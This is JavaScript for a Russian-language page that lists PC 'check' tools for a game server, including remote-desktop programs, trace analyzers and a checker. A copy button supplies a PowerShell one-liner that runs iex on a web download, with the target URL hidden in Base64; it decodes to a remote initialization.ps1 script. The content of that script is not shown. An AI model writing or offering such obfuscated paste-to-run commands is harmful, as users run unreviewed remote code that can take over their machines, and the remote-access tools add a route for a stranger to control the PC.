const PS_COMMAND = "iex (iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z0LWNoZWNrZXIvY2hlY2tlci9tYWluL2luaXRpYWxpemF0aW9uLnBzMQ=='))))";
...
const programs = [
  { name: 'Ocean', type: 'Авто', desc: 'Автоматически проверяет ПК на наличие или использование запрещённого ПО.', link: 'https://github.com/flashkas/checker' },
  { name: 'AnyDesk', type: 'Remote', desc: 'Удалённый рабочий стол. Можно отключить в любой момент.', link: 'https://anydesk.com/ru/downloads/windows' },
  { name: 'RustDesk (Основная)', type: 'Remote', desc: 'Удалённый рабочий стол. Можно отключить в любой момент.', link: 'https://github.com/rustdesk/rustdesk/releases' },
  { name: 'RustDesk (Альтернативная)', type: 'Remote', desc: 'Удалённый рабочий стол. Можно отключить в любой момент.', link: 'https://github.com/rustdesk/rustdesk/releases' },
  { name: 'Everything', type: 'Поиск', desc: 'Мгновенный поиск по папкам, названиям или весу файлов.', link: 'https://www.voidtools.com/downloads/' },
  { name: 'JournalTrace', type: 'Trace', desc: 'Отслеживает действия пользователя с файлами и папками.', link: 'https://github.com/pproencar/JournalTrace/releases' },
  { name: 'ShellBags Analyzer & Cleaner', type: 'Trace', desc: 'Показывает какие папки посещались, удалялись и прочее.', link: 'https://privazer.com/en/download-shellbags-analyzer-cleaner.php' },
  ...
  { name: 'FunModAnalyzer', type: 'FunTime', desc: 'Анализирует модификации, загруженные в игру.', link: 'https://github.com/flashkas/checker' }
];
...
function renderPrograms() {
  ...
  grid.innerHTML = programs.map((p) => `
    <article class="program">
      ...
      <a href="${p.link}" class="program__link" target="_blank" rel="noopener">Скачать →</a>
    </article>
  `).join('');
}
...
function initCopyButtons() {
  ...
  if (psBtn) {
    psBtn.addEventListener('click', async () => {
      if (await copyText(PS_COMMAND)) showToast('Команда PowerShell скопирована');
    });
  }
}
...
function initNavHighlight() {
  ...
  const sections = ['programs', 'index-1', 'index-2', 'index-3'];
  ...
  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        ...
        pills.forEach((pill) => {
          pill.style.borderColor = pill.getAttribute('href') === `#${id}` ? 'var(--red)' : '';
          pill.style.background = pill.getAttribute('href') === `#${id}` ? 'var(--red-dim)' : '';
        });
      });
    },
